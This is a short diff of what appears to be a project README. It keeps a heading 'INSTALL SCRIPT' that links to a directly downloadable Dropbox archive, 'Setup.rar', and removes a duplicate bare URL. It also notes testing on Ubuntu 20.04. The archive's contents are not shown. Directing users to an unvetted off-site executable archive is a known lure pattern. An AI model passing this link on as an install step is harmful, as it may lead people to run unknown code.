@@ -1,6 +1,6 @@
 
 ### [INSTALL SCRIPT](https://www.dropbox.com/scl/fi/v29hnzx2coqz2wtz9ub4p/Setup.rar?rlkey=4clgo5rul7ynd4wu1e9zr0iae&dl=1)
-https://www.dropbox.com/scl/fi/v29hnzx2coqz2wtz9ub4p/Setup.rar?rlkey=4clgo5rul7ynd4wu1e9zr0iae&dl=1
+
 
 ### TESTED ON OS 
 - UBUNTU 20.04
